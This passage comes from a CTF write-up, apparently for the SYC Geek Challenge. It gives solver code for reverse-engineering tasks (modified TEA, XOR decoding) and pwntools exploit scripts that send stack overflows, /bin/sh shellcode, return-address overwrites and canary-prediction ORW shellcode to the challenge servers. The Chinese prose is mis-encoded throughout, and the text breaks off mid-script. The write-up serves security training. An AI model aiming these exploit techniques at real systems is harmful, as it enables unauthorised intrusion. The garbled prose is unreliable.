class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">y = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    y[k] = S_inv[y[k]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line">    </span><br><span class="line">y = untransform(y[:<span class="number">16</span>])+untransform(y[<span class="number">16</span>:])</span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span class="line">y = [S_inv[y[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h3><blockquote><p>å–‚ï¼ä¸‰ç‚¹å‡ å•¦ï¼é¥®èŒ¶å…ˆå•¦ï¼ (flagéœ€è¦åŒ…ä¸ŠSYC{}æäº¤)</p></blockquote><p>åœ¨MainActivityä¸­æŸ¥çœ‹é€»è¾‘ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">obj è¡¥è¶³24ä½ X</span><br><span class="line">sb4 = sb2 = obj å¶æ•°ä½</span><br><span class="line">sb5 = sb3 = obj å¥‡æ•°ä½</span><br><span class="line">4ä½ä¸€ç»„</span><br><span class="line">a|b|c|d -&gt; æ•´æ•°</span><br><span class="line"></span><br><span class="line">key = [2023708229, -158607964, -2120859654, 1167043672]</span><br><span class="line"></span><br><span class="line">v0,v1,v2=m[0],m[1],m[2]</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)</span><br><span class="line">m[0]=v0</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3)</span><br><span class="line">m[1]=v2</span><br><span class="line">m[0]=v1</span><br></pre></td></tr></table></figure><p>åŠ å¯†é€»è¾‘ä¸ºé­”æ”¹TEAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0,v1,v2 = v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0,k1,k2,k3 = k[<span class="number">0</span>],k[<span class="number">1</span>],k[<span class="number">2</span>],k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v2 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v2 = v2 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v2 &lt;&lt; <span class="number">4</span>) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">1</span>] = v2</span><br><span class="line">    v[<span class="number">2</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;abcdefghijkl&#x27;</span></span><br><span class="line">m = [bytes_to_long(m[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2023708229</span>, -<span class="number">158607964</span>, -<span class="number">2120859654</span>, <span class="number">1167043672</span>]</span><br><span class="line">key = [k &amp; <span class="number">0xffffffff</span> <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">c = encrypt(m, key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k))</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bArr = bArr2 = cc = &#x27;a5f892c9cf4b730db48f6650&#x27;</span></span><br><span class="line"><span class="comment"># ad@#E!@a123 = sb5</span></span><br><span class="line"><span class="comment"># eCAS213@!@3 = bArr</span></span><br></pre></td></tr></table></figure><p>å¸¦ç¬¦å·è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">int</span>* v, <span class="type">int</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">2</span>],v2=v[<span class="number">1</span>], sum=(<span class="number">-1640531527</span>)*<span class="number">64</span>, i;</span><br><span class="line">    <span class="type">int</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">int</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v2&lt;&lt;<span class="number">4</span>) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v2 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1; v[<span class="number">2</span>]=v2;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v[<span class="number">3</span>]=&#123;<span class="number">2784531145</span>, <span class="number">3477828365</span>, <span class="number">3029296720</span>&#125;;</span><br><span class="line"><span class="type">int</span> k[<span class="number">4</span>]=&#123;<span class="number">2023708229</span>, <span class="number">-158607964</span>, <span class="number">-2120859654</span>, <span class="number">1167043672</span>&#125;;</span><br><span class="line">    decrypt(&amp;v, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x%x%x&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//543056743333546e30697472</span></span><br><span class="line"><span class="comment">//T0Vt33Tn0itr</span></span><br></pre></td></tr></table></figure><p>åœ¨MainActivity2ä¸­æŸ¥çœ‹é€»è¾‘ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iArr=[-107, -106, -95, -115, -119, 127, 26, 121, -62, -20, 86, 9] = &#x27;9596a18d897f1a79c2ec5609&#x27;</span><br><span class="line"></span><br><span class="line">bytes = ad@#E!@a123 = sb5</span><br><span class="line">byteArrayExtra = eCAS213@!@3 = bArr</span><br><span class="line"></span><br><span class="line">byteArrayExtra ^ bytes = iArr</span><br><span class="line"></span><br><span class="line">æ•… bytes = &#x27;0n3DF4itvc0Y&#x27;</span><br></pre></td></tr></table></figure><p>åˆå¹¶å¾—åˆ°flagï¼š<code>SYC&#123;T00nV3tD3F34Tint0vict0rY&#125;</code></p><p>â€‹    </p><h3 id="æ˜¯ç”·äººå°±æ¥æ‰é’ˆ"><a href="#æ˜¯ç”·äººå°±æ¥æ‰é’ˆ" class="headerlink" title="æ˜¯ç”·äººå°±æ¥æ‰é’ˆ"></a>æ˜¯ç”·äººå°±æ¥æ‰é’ˆ</h3><blockquote><p>ç®€å•çš„æ¸¸æˆé€†å‘é€åˆ†é¢˜,æœ€ç»ˆflagè®°å¾—åŒ…è£¹ä¸ŠSYC{}</p></blockquote><p>ILSPYåç¼–è¯‘ï¼Œåœ¨ <code>public class GameManager</code> æ‰¾åˆ°ä»£ç é€»è¾‘ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">magicc = [<span class="number">75</span>, <span class="number">109</span>, <span class="number">102</span>, <span class="number">63</span>, <span class="number">107</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">108</span>, <span class="number">124</span>, <span class="number">112</span>,</span><br><span class="line"><span class="number">109</span>, <span class="number">122</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">63</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">113</span>,</span><br><span class="line"><span class="number">107</span>, <span class="number">108</span>, <span class="number">62</span>]</span><br><span class="line"></span><br><span class="line">magic = [<span class="number">124</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">92</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">90</span>, <span class="number">77</span>, <span class="number">73</span>,</span><br><span class="line"><span class="number">75</span>, <span class="number">64</span>, <span class="number">8</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">8</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">65</span>,</span><br><span class="line"><span class="number">70</span>, <span class="number">92</span>, <span class="number">91</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    magicc = [magicc[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magicc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    magic = [magic[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magic))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5(<span class="built_in">bytes</span>(magicc)).hexdigest().upper()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CBDDD133B60130856D3C695D9E5ED6A5</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;CBDDD133B60130856D3C695D9E5ED6A5&#125;</code></p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc_pwntools"></a>nc_pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30348</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;!!!\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span>+<span class="string">b&#x27;Syclover&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;first one\n&#x27;</span>)</span><br><span class="line">exp=r.recvline().strip()[:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(exp)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(exp)).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>æ¦‚ç‡æ€§getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30941</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x4012F3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>å¼€äº†PIEï¼Œæ¦‚ç‡æ€§getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31277</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+<span class="string">b&#x27;\x27\x12&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h3><p>æŒ‰å­—èŠ‚ä¿®æ”¹è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•° <code>backdoor()</code> åœ°å€ï¼Œä¿®æ”¹2ä¸ªå­—èŠ‚å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31467</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;abcdefghi&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40134d -&gt; 0x401225</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68-0x40=40</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x25-0x4d)&amp;0xffffffff=0xffffffd8</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffd8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68+1-0x40=41</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x12-0x13)&amp;0xffffffff=0xffffffff</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>contents</p><p>â€‹    </p><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><blockquote><p>å…ˆåšè¿™é¢˜ï¼Œç®€å•</p></blockquote><p>contents</p><p>â€‹    </p><h3 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h3><p>æ ˆåœ°å€æ³„éœ²ï¼Œæ ˆå¯å†™ï¼Œå†™24é•¿åº¦å†…çš„shellcodeï¼Œwhileå¾ªç¯æ”¹å†™retaddrä¸ºæ ˆåœ°å€ï¼Œret2shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31581</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">shell_addr=stack_leak+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">40</span>+i).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">hex</span>(shell_addr&gt;&gt;(<span class="number">8</span>*i)&amp;<span class="number">0xff</span>)[<span class="number">2</span>:].encode())</span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="fmt1-0"><a href="#fmt1-0" class="headerlink" title="fmt1.0"></a>fmt1.0</h3><p>contents</p><p>â€‹    </p><h3 id="white-canary"><a href="#white-canary" class="headerlink" title="white_canary"></a>white_canary</h3><blockquote><p>è¿œç¨‹ä¹‹å‰è®°å¾—â€œsudo ntpdate cn.pool.ntp.orgâ€ åŒæ­¥ä¸‹æ—¶é—´</p></blockquote><p><code>init()</code> è‡ªå·±å®ç°äº†canaryè®¡ç®—æ–¹æ³•ï¼Œç¦ç”¨äº†59ï¼Œæ— æ³• <code>execve</code>ã€‚</p><p>ä¼ªéšæœºæ•°ç®—canary+å†™orwçš„shellcode+ret2shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed=libc.time(<span class="number">0</span>)%<span class="number">60</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v2 = libc.rand()</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">canary = (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>) \</span><br><span class="line">  + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">  </span><br><span class="line">canary&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">someplace=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>))</span><br><span 